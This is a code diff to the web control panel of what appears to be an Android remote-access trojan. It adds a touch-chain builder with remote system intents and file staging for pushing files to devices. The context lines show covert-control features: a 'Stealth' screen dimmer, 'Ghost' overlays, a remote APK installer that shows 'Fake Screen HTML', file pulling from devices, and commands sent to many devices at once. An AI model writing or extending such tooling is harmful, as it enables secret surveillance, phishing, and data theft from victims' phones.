@@ -346,7 +346,27 @@
                 css: 'sys', 
                 search: 'wake, touch, brightness, screen, dimmer, ui, inject, intent, ghost, chain, unblind',
                 commands: [
-                    { id: 'REMOTE_TOUCH', name: 'Execute Touch Chain', icon: '⛓️', inputs: [{id: 'touch-json-raw', label: 'Chain JSON', type: 'textarea'}] },
+                    { 
+                        id: 'REMOTE_TOUCH', 
+                        name: 'Execute Touch Chain', 
+                        icon: '⛓️', 
+                        inputs: [{id: 'touch-json-raw', label: 'Chain JSON (Auto-Generated)', type: 'textarea'}], 
+                        customUI: `
+                            <div class="card" style="padding:10px; border-style:dashed; margin-bottom:10px; background:rgba(0,243,255,0.02);">
+                                <div id="touch-chain-list" style="display:flex; flex-direction:column; gap:5px; margin-bottom:10px;"></div>
+                                <div style="display:flex; gap:5px;">
+                                    <select id="next-step-type" style="flex:1; background:#000; color:var(--primary); border:1px solid #333; font-size:0.7rem;">
+                                        <option value="NODE">TAP NODE (ID/Text)</option>
+                                        <option value="TAP">TAP COORD (X,Y)</option>
+                                        <option value="NAV">NAV ACTION</option>
+                                        <option value="WAIT">WAIT (ms)</option>
+                                        <option value="SWIPE">SWIPE (X1,Y1,X2,Y2)</option>
+                                        <option value="INTENT">REMOTE INTENT (SYS)</option>
+                                    </select>
+                                    <button class="btn" onclick="addTouchStep()" style="padding:5px 10px; font-size:0.6rem;">+ STEP</button>
+                                </div>
+                            </div>` 
+                    },
                     { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
                     { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
@@ -405,7 +425,21 @@
                 css: 'sys', 
                 search: 'pull, push, file, skeleton, index, install, deploy, vault',
                 commands: [
-                    { id: 'PUSH_FILE', name: 'Deploy File to Device', icon: '📤', inputs: [{id: 'push-url', label: 'Source URL', type: 'text'}, {id: 'push-path', label: 'Target Path', type: 'text'}] },
+                    { 
+                        id: 'PUSH_FILE', 
+                        name: 'Deploy File to Device', 
+                        icon: '📤', 
+                        inputs: [
+                            {id: 'push-url', label: 'Source URL (http://...)', type: 'text'},
+                            {id: 'push-path', label: 'Remote Destination Path', type: 'text'}
+                        ], 
+                        customUI: `
+                            <div style="margin-bottom:10px;">
+                                <label class="btn" style="width:100%; padding:10px; font-size:0.7rem; display:flex; align-items:center; justify-content:center; gap:10px; border-style:dashed;">
+                                    📁 STAGE LOCAL FILE TO VAULT <input type="file" id="push-local-file" style="display:none" onchange="document.getElementById('push-url').value = 'LOCAL: ' + this.files[0].name">
+                                </label>
+                            </div>` 
+                    },
                     { id: 'PULL_FILE', name: 'Download File from Device', icon: '📥', inputs: [{id: 'val-pull', label: 'Remote Path', type: 'text'}] },
                     { id: 'GET_SKELETON', name: 'Scan File Structure', icon: '🦴', inputs: [{id: 'val-skeleton', label: 'Depth (1-10)', type: 'number', val: 5}] },
                     { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}], cleanup: 'STOP_INSTALL' }
@@ -445,6 +479,7 @@
                                 </div>
                                 <div class="cmd-drawer" id="drawer-${cmd.id}">
                                     <div class="drawer-inputs">
+                                        ${cmd.customUI || ''}
                                         ${cmd.inputs.map(input => `
                                             <div style="margin-bottom:10px;">
                                                 <label style="display:block; font-size:0.6rem; color:var(--primary); margin-bottom:4px;">${input.label}</label>
@@ -850,6 +885,12 @@
                     case 'SET_PROMOS':
                         content = document.getElementById('promo-templates').value; break;
                 }
+            }
+
+            // Special Handling for complex deployments
+            if (type === 'PUSH_FILE' && forcedVal === null) {
+                handlePushDeployment();
+                return;
             }
 
             const commands = Array.from(selectedDeviceIds).map(id => ({
